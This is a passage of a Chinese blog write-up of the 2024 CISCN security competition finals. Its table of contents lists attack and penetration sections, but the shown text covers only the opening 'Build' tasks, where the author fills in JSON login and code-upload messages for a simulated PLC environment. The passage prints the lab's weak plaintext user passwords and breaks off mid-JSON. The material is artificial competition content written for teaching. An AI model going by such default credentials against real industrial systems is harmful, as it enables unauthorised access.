
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>2024CISCN决赛 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Build"><span class="toc-number">2.</span> <span class="toc-text">Build</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E6%89%8B%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.1.</span> <span class="toc-text">新手任务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E5%BA%94%E7%94%A8%E4%BA%86%E8%A7%A3"><span class="toc-number">2.1.1.</span> <span class="toc-text">背景应用了解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%99%BB%E5%BD%95%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">模拟工程师登录流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E9%80%BB%E8%BE%91%E4%BB%A3%E7%A0%81%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">模拟逻辑代码上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%BB%E8%BE%91%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">模拟二进制逻辑上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9FPLC%E9%80%BB%E8%BE%91%E5%90%AF%E5%8A%A8"><span class="toc-number">2.1.1.4.</span> <span class="toc-text">模拟PLC逻辑启动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E6%93%8D%E4%BD%9C%E5%91%98%E7%99%BB%E5%BD%95%E8%A1%8C%E4%B8%BA"><span class="toc-number">2.1.1.5.</span> <span class="toc-text">模拟操作员登录行为</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E6%93%8D%E4%BD%9C%E5%91%98%E7%9A%84%E4%B8%80%E7%BB%84plc%E6%93%8D%E4%BD%9C"><span class="toc-number">2.1.1.6.</span> <span class="toc-text">模拟操作员的一组plc操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95"><span class="toc-number">2.1.2.</span> <span class="toc-text">身份认证安全测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">中间人攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%91%E6%88%98-%E5%BA%94%E7%AD%94%E6%9C%BA%E5%88%B6"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">挑战-应答机制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%A8%A1%E6%8B%9F%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">攻击模拟任务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.2.1.</span> <span class="toc-text">越权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E9%80%BB%E8%BE%91"><span class="toc-number">2.2.2.</span> <span class="toc-text">恶意逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#modbus%E6%95%B0%E6%8D%AE%E7%9B%91%E5%90%AC%E4%B8%8E%E7%AF%A1%E6%94%B9"><span class="toc-number">2.2.3.</span> <span class="toc-text">modbus数据监听与篡改</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E6%8B%9F%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.3.</span> <span class="toc-text">访问控制模拟任务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%92%E8%89%B2%E9%AA%8C%E8%AF%81"><span class="toc-number">2.3.1.</span> <span class="toc-text">角色验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%92%E8%89%B2%E6%9D%83%E9%99%90%E9%99%90%E5%88%B6"><span class="toc-number">2.3.2.</span> <span class="toc-text">角色权限限制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E4%BF%9D%E6%8A%A4%E6%A8%A1%E6%8B%9F%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.4.</span> <span class="toc-text">密码保护模拟任务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF"><span class="toc-number">3.</span> <span class="toc-text">CTF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AWDP"><span class="toc-number">4.</span> <span class="toc-text">AWDP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">5.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjs"><span class="toc-number">5.1.</span> <span class="toc-text">ezjs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-number">5.1.1.</span> <span class="toc-text">预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">5.1.2.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fix"><span class="toc-number">5.1.3.</span> <span class="toc-text">fix</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ShareCard%EF%BC%88break%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">5.2.</span> <span class="toc-text">ShareCard（break复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fix-1"><span class="toc-number">5.2.1.</span> <span class="toc-text">fix</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SolonMaster%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">5.3.</span> <span class="toc-text">SolonMaster（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fix%EF%BC%88Failed%EF%BC%89"><span class="toc-number">5.3.1.</span> <span class="toc-text">fix（Failed）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fobee%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">5.4.</span> <span class="toc-text">Fobee（Unsolved）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-PHP%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">Pwn-PHP（不完整复现）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">7.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ERP"><span class="toc-number">7.1.</span> <span class="toc-text">ERP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WIN-OPS88"><span class="toc-number">7.2.</span> <span class="toc-text">WIN-OPS88</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RODC%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">7.3.</span> <span class="toc-text">RODC（Unsolved）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jinkens"><span class="toc-number">7.4.</span> <span class="toc-text">Jinkens</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gitlab%EF%BC%88TimeOut%EF%BC%89"><span class="toc-number">7.5.</span> <span class="toc-text">Gitlab（TimeOut）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#portal%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">7.6.</span> <span class="toc-text">portal（Unsolved）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WIN-PC3788%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">7.7.</span> <span class="toc-text">WIN-PC3788（Unsolved）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DC%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">7.8.</span> <span class="toc-text">DC（Unsolved）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%B8%E8%AE%B0%EF%BC%88%EF%BC%9F"><span class="toc-number">8.</span> <span class="toc-text">游记（？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#day0"><span class="toc-number">8.1.</span> <span class="toc-text">day0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#day1"><span class="toc-number">8.2.</span> <span class="toc-text">day1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#day2"><span class="toc-number">8.3.</span> <span class="toc-text">day2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%97%A5%E8%B0%88"><span class="toc-number">8.4.</span> <span class="toc-text">后日谈</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>2024CISCN决赛</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/7/12
        </span>
        
        <span class="category">
            <a href="/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                线下赛
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E5%86%85%E7%BD%91/" style="color: #00a596">内网</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/SSTI/" style="color: #00bcd4">SSTI</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/jwt/" style="color: #ff7d73">jwt</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" style="color: #00bcd4">沙箱逃逸</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/CVE/" style="color: #ffa2c4">CVE</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/Jenkins/" style="color: #00bcd4">Jenkins</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/Tomcat/" style="color: #00a596">Tomcat</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/GitLab/" style="color: #00bcd4">GitLab</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/SMB/" style="color: #00bcd4">SMB</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">18.7k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">94分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2024.7.20-21	成都</p>
<p>NISA-WhySerious	位37	全国二等奖</p>
<span id="more"></span>

<p>wp参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.hxzzz.asia/archives/192/">https://blog.hxzzz.asia/archives/192/</a></p>
<p><a target="_blank" rel="noopener" href="https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3">https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15977">https://xz.aliyun.com/news/15977</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/F12-blog/p/18324587">https://www.cnblogs.com/F12-blog/p/18324587</a></p>
<hr>
<h1 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h1><p>过…过样例？</p>
<p>本关考验你中译中的能力（x</p>
<p>我就看了前两个任务，队友tql，连通俩宵ak了build</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721222456197.png" alt="image-20240721222456197"></p>
<h2 id="新手任务"><a href="#新手任务" class="headerlink" title="新手任务"></a>新手任务</h2><h3 id="背景应用了解"><a href="#背景应用了解" class="headerlink" title="背景应用了解"></a>背景应用了解</h3><h4 id="模拟工程师登录流程"><a href="#模拟工程师登录流程" class="headerlink" title="模拟工程师登录流程"></a>模拟工程师登录流程</h4><blockquote>
<p>在工程师用户（instance&#x2F;engineer&#x2F;user)目录下，编写engineer_login.msg， 填充工程师用户名与口令, 而后试运行users_login.sh，确认用户登录成功。</p>
</blockquote>
<p>engineer_login.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
	<span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">""</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用json格式定义了cube架构中一个格式为（GENERAL_RETURN,STRING)的数据项，这个数据项是一个通用数据项，由两个字符串name和return_value组成：</p>
<ul>
<li>name用来描述数据项的类型或用途，这里name取值为login，表示该数据项用于登录</li>
<li>return_value则填充该数据项具体内容，return_value的引号内则按照“用户名：口令”的方式填充内容</li>
</ul>
<p>注：用户名和口令信息在管理中心工作目录(instance&#x2F;monitor&#x2F;center)里寻找</p>
<p><a id="user.list">instance&#x2F;monitor&#x2F;center&#x2F;user.list</a></p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"SERVER_STATE"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span>
	<span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span>
	<span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span>
	<span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"sun"</span><span class="token punctuation">,</span>
	<span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_MONITOR"</span><span class="token punctuation">,</span>
	<span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"li"</span><span class="token punctuation">,</span>
	<span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span>
	<span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"zhou"</span><span class="token punctuation">,</span>
	<span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"wu"</span><span class="token punctuation">,</span>
	<span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>于是填入engineer_login.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
	<span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后运行users_login.sh即可</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712104227225.png" alt="image-20240712104227225"></p>
<hr>
<h4 id="模拟逻辑代码上传"><a href="#模拟逻辑代码上传" class="headerlink" title="模拟逻辑代码上传"></a>模拟逻辑代码上传</h4><blockquote>
<p>在2024buildup&#x2F;src&#x2F;logic&#x2F;thermostat_logic目录下写了一个模拟PLC行为的代码，用其源码thermostat_logic.c来模拟PLC源码，其编译后的动态库libthermostat_logic.so来模拟PLC逻辑。请在工程师用户目录编写code_upload.msg，填写正确的上传代码信息，试运行并完成代码上传功能。</p>
</blockquote>
<p>instance&#x2F;engineer&#x2F;user&#x2F;code_upload.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span>
	<span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span>
	<span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>(PLC_ENGINEER,LOGIC_UPLOAD)</code>数据结构：</p>
<table>
<thead>
<tr>
<th>元素名称</th>
<th>元素类型</th>
<th>元素大小</th>
<th>信息内容</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>plc_devname</td>
<td>0结尾字符串</td>
<td>&lt;&#x3D;32字节</td>
<td>设备的名称</td>
<td></td>
</tr>
<tr>
<td>logic_filename</td>
<td>0结尾字符串</td>
<td>&lt;&#x3D;32字节</td>
<td>代码文件的名称</td>
<td></td>
</tr>
<tr>
<td>type</td>
<td>ENUM</td>
<td>4字节</td>
<td>文件类型</td>
<td>使用<strong>enum_plc_file_type枚举</strong></td>
</tr>
<tr>
<td>uuid</td>
<td>UUID</td>
<td>32字节</td>
<td>代码的摘要值</td>
<td></td>
</tr>
<tr>
<td>author</td>
<td>0结尾字符串</td>
<td>&lt;&#x3D;32字节</td>
<td>代码作者的名称</td>
<td></td>
</tr>
<tr>
<td>uploader</td>
<td>0结尾字符串</td>
<td>&lt;&#x3D;32字节</td>
<td>上传行为执行者名称</td>
<td></td>
</tr>
<tr>
<td>time</td>
<td>INT</td>
<td>4字节</td>
<td>上传行为执行时间</td>
<td></td>
</tr>
</tbody></table>
<p>修改code_upload.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span>
